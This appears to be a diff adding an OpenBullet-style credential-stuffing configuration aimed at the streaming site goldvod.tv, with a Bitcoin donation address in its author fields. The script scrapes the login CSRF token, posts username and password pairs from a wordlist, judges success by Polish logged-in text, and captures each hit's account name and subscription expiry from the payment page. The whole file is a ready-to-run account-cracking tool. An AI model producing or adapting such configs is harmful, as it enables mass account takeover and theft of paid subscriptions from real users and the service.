@@ -1,0 +1,83 @@
+[SETTINGS]
+{
+  "Name": "goldvod.tv + capture",
+  "SuggestedBots": 10,
+  "MaxCPM": 0,
+  "LastModified": "2019-06-20T03:51:44.4215998-07:00",
+  "AdditionalInfo": "Donations - 1HDZRxs5HK7bq6PZqtQb33vN1FfLEn4Ur9",
+  "Author": "Donations - 1HDZRxs5HK7bq6PZqtQb33vN1FfLEn4Ur9",
+  "Version": "1.1.3",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "EncodeData": false,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST GET "http://goldvod.tv/login.html" 
+  
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3" 
+  HEADER "Accept-Encoding: gzip, deflate" 
+  HEADER "Accept-Language: en-US,en;q=0.9" 
+  HEADER "Cache-Control: max-age=0" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Host: goldvod.tv" 
+  HEADER "Referer: http://goldvod.tv/home.html" 
+  HEADER "Upgrade-Insecure-Requests: 1" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36" 
+
+PARSE "<SOURCE>" LR "<input type=\"hidden\" name=\"csrf\" value=\"" "\" />" -> VAR "csrf" 
+
+REQUEST POST "http://goldvod.tv/login.html" 
+  CONTENT "login=<USER>&pass=<PASS>&csrf=<csrf>&logged=" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3" 
+  HEADER "Accept-Encoding: gzip, deflate" 
+  HEADER "Accept-Language: en-US,en;q=0.9" 
+  HEADER "Cache-Control: max-age=0" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Content-Length: 112" 
+  HEADER "Content-Type: application/x-www-form-urlencoded" 
+  HEADER "Host: goldvod.tv" 
+  HEADER "Origin: http://goldvod.tv" 
+  HEADER "Referer: http://goldvod.tv/login.html" 
+  HEADER "Upgrade-Insecure-Requests: 1" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36" 
+
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "Zaloguj się" 
+  KEYCHAIN Success OR 
+    KEY "Wyloguj się " 
+    KEY "Zalogowany jako:" 
+
+REQUEST GET "http://goldvod.tv/profile_payment.html" 
+  
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3" 
+  HEADER "Accept-Encoding: gzip, deflate" 
+  HEADER "Accept-Language: en-US,en;q=0.9" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Cookie: PHPSESSID=fusoqebl5c32hipqpi14cnfki0" 
+  HEADER "Host: goldvod.tv" 
+  HEADER "Referer: http://goldvod.tv/profile.html" 
+  HEADER "Upgrade-Insecure-Requests: 1" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36" 
+
+PARSE "<SOURCE>" LR "            <strong>" "</strong><br />" -> CAP "Account" 
+
+PARSE "<SOURCE>" LR "Ważne do: <strong class='st_y'>" "</strong>" -> CAP "Valid until" 
+
